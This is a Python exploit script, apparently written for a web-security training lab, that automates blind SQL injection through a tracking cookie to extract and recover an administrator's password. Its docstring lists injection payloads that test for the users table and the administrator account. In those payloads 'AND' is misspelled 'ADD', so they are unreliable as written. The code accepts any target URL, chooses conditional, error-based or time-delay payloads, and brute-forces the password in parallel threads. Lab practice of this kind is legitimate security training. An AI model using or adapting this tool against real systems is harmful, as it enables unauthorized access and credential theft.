"""
This lab contains a blind SQL injection vulnerability. 
The application uses a tracking cookie for analytics, 
and performs a SQL query containing the value of the submitted cookie.
The results of the SQL query are not returned, 
and no error messages are displayed. 
But the application includes a "Welcome back" message in the page if the query returns any rows.
The database contains a different table called users, with columns called username and password. 
You need to exploit the blind SQL injection vulnerability to find out the password of the administrator user.
To solve the lab, log in as the administrator user. 

Vulnerable attributes = Tracking cookie

END GOAL

    1. ENUMULATE ADMINISTRATOR PASSWORD

    2. LOGIN AS ADMINISTRATOR


test injection possibility by using conditional queries

cm1O48qFb9AFJKwU' ADD '1'='1'--  >should show Welcome back message on the website
cm1O48qFb9AFJKwU' ADD '1'='2'--  >should show not Welcome back message on the website


# Confirm that  the user table exits
cm1O48qFb9AFJKwU' ADD (SELECT 'x' FROM users LIMIT 1)='x'--  >should show Welcome back message on the website

# Confirm a user with the administrator username

cm1O48qFb9AFJKwU' ADD (SELECT 'x' FROM users WHERE username='administrator')='x'--  >should show Welcome back message on the website

"""
import argparse
from concurrent.futures import ThreadPoolExecutor
from injector import Injector
from utils import POISON_STASH


if __name__ == "__main__":
    parser = argparse.ArgumentParser()

    parser.add_argument("url", help="Your endpoint url")

    parser.add_argument("space", help="password length search space")

    group = parser.add_mutually_exclusive_group(required=True)

    group.add_argument('--conditional', action ='store_true')
    group.add_argument('--errorInduction', action ='store_true')
    group.add_argument('--timeDelay', action ='store_true')

    args = parser.parse_args()

    print("(+) Starting the session")

    if args.conditional:

        injector = Injector(
            url=args.url,
            poison=POISON_STASH['conditional'],
            length_scope=args.space,
            conditional=True
        )

    if args.errorInduction:

        injector = Injector(
            url=args.url,
            poison=POISON_STASH['error_induction'],
            length_scope=args.space,
            error_induction=True
        )

    if args.timeDelay:

        injector = Injector(
            url=args.url,
            poison=POISON_STASH['time_delay'],
            length_scope=args.space,
            time_delay=True
        )

    length = injector.find_password_length()

    unknowns = [{"confirmed": None, "position": n+1} for n in range(length)]

    with ThreadPoolExecutor(max_workers=4) as executors:
        for unknown in unknowns:
            executors.submit(injector.harvest_password, unknown)

    print(f'password found: {"".join(injector.password_found)}')

